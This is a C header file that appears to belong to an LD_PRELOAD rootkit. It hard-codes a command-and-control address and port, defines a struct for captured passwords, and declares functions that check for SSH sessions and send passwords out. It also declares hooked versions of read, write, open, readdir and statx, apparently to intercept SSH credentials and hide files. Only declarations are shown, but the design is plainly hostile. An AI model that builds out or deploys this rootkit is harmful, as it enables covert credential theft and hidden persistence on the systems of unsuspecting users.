#ifndef PRELOAD_H
#define PRELOAD_H

#define _GNU_SOURCE

#include <stdio.h>
#include <unistd.h>
#include <string.h>
#include <stdlib.h>
#include <dlfcn.h>
#include <pthread.h>
#include <stdarg.h>
#include <dirent.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#define C2_IP "172.21.0.2"
#define C2_PORT 6000

typedef struct pass_arg {
    char password[64];
    char arg[64];
} pass_args;
void get_ssharg(pass_args *combo);
int checkifssh(int fd);
ssize_t write(int fd, const void *buf, size_t nbyte);
ssize_t read(int fd, void *buf, size_t nbyte);
void *Validate(void *arg);

int open(const char *pathname, int flags, ...);
struct dirent *readdir(DIR *dirp);
struct dirent64 *readdir64(DIR *dirp);
int statx(int dirfd, const char *pathname, int flags, unsigned int mask, struct statx *buf);

void sendPassword();

#endif  
